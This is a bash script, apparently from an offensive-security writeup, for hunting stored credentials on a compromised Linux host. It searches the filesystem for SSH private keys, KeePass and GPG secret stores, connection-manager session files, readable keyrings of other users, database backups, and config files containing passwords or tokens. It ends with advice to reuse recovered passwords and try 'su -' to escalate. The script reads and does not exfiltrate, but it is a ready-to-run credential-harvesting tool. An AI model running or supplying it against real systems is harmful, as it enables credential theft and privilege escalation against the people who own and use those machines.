#!/usr/bin/env bash
# Read-only sweep for stored credentials on a foothold: connection-manager
# session files, keyrings, key material, password databases, and backups.
# Reads only; copies/cracks nothing. Authorized and educational use only.
# Writeup: https://jperezduerto.info/techniques/credential-stores-backups-connection-managers/

section() { printf '\n=== %s ===\n' "$1"; }

section "Connection-manager session stores"
find / -type f \( \
  -name 'sessions-backup.dat' -o -name '*.rdg' -o -name 'confCons.xml' \
  -o -name 'sitemanager.xml' -o -name 'recentservers.xml' -o -name 'mremoteng*.xml' \
  \) 2>/dev/null

section "Key material and password databases"
find / -type f \( \
  -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.ppk' -o -name '*.kdbx' \
  -o -name '*.gpg' -o -name 'secring.*' \) 2>/dev/null | grep -vE '^/proc|^/sys'

section "Readable other-user keyrings (reuse, not crack)"
for d in /home/*/.gnupg /root/.gnupg /home/*/.ssh /root/.ssh; do
  [ -r "$d" ] 2>/dev/null && echo "readable: $d"
done

section "Backups and archives (may ship the live DB)"
find / -type f \( -name '*.bak' -o -name '*.sql' -o -name '*.sqlite' -o -name '*.sqlite3' \
  -o -name 'backup*.zip' -o -name '*.tar.gz' \) 2>/dev/null | grep -vE '^/usr|^/proc|^/sys' | head -40
ls -la /opt/backups /var/backups 2>/dev/null

section "Secrets in app config / env on disk"
grep -rilE 'password|secret|api_?token|jdbc|connectionstring' \
  /var/www /opt /srv /home 2>/dev/null | head -20

printf '\nOrder of play: find the store, then look for its password in whatever the user was running (a DB, a .env). The store password is often reused; recovered creds are often higher-privileged, so test su - locally first.\n'
